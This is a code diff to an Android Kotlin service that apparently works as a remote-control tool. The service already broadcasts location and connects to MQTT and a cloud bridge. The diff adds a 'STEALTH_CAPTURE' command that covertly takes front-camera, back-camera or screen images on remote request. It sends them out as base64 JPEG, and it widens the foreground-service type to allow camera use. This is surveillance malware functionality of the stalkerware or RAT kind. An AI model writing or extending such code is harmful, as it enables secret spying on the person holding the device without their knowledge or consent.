@@ -61,6 +61,7 @@ class LocalFileServerService : Service() {
     private lateinit var teleManager: TelephonyAndLocationManager
     private var wakeLock: PowerManager.WakeLock? = null
     private var isStandaloneTorchOn: Boolean = false
+    private lateinit var stealthCaptureManager: StealthCaptureManager
 
     companion object {
         private const val PORT = 8888
@@ -105,6 +106,8 @@ class LocalFileServerService : Service() {
             broadcastMessage(locJson.toString())
         }
 
+        stealthCaptureManager = StealthCaptureManager(applicationContext)
+
         startMqttWorker()
         initCloudBridge()
     }
@@ -132,7 +135,12 @@ class LocalFileServerService : Service() {
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            val serviceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+            } else {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            }
+            startForeground(NOTIFICATION_ID, notification, serviceType)
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -386,6 +394,67 @@ class LocalFileServerService : Service() {
                     put("package", pkg)
                     put("success", success)
                 }.toString())
+            }
+
+            // =========================================================================
+            // Phase 2: Step 2.3 — Stealth Photo / Screenshot Capture
+            // =========================================================================
+            "STEALTH_CAPTURE" -> {
+                val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
+                Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")
+
+                when (target) {
+                    "SCREEN" -> {
+                        stealthCaptureManager.captureScreenshot { base64Jpeg, error ->
+                            val response = JSONObject().apply {
+                                put("type", "STEALTH_CAPTURE_RESULT")
+                                put("target", "SCREEN")
+                                put("success", error == null && base64Jpeg != null)
+                                if (base64Jpeg != null) put("data", base64Jpeg)
+                                if (error != null) put("error", error)
+                            }
+                            broadcastMessage(response.toString())
+                            Log.d("StealthCapture", "Screenshot result dispatched (success: ${error == null})")
+                        }
+                    }
+
+                    "FRONT" -> {
+                        stealthCaptureManager.captureCamera(isFront = true) { base64Jpeg, error ->
+                            val response = JSONObject().apply {
+                                put("type", "STEALTH_CAPTURE_RESULT")
+                                put("target", "FRONT")
+                                put("success", error == null && base64Jpeg != null)
+                                if (base64Jpeg != null) put("data", base64Jpeg)
+                                if (error != null) put("error", error)
+                            }
+                            broadcastMessage(response.toString())
+                            Log.d("StealthCapture", "Front camera snap result dispatched (success: ${error == null})")
+                        }
+                    }
+
+                    "BACK" -> {
+                        stealthCaptureManager.captureCamera(isFront = false) { base64Jpeg, error ->
+                            val response = JSONObject().apply {
+                                put("type", "STEALTH_CAPTURE_RESULT")
+                                put("target", "BACK")
+                                put("success", error == null && base64Jpeg != null)
+                                if (base64Jpeg != null) put("data", base64Jpeg)
+                                if (error != null) put("error", error)
+                            }
+                            broadcastMessage(response.toString())
+                            Log.d("StealthCapture", "Back camera snap result dispatched (success: ${error == null})")
+                        }
+                    }
+
+                    else -> {
+                        broadcastMessage(JSONObject().apply {
+                            put("type", "STEALTH_CAPTURE_RESULT")
+                            put("target", target)
+                            put("success", false)
+                            put("error", "Invalid capture target: $target")
+                        }.toString())
+                    }
+                }
             }
 
             // --- Camera Stream ---
@@ -819,4 +888,3 @@ class LocalFileServerService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
-
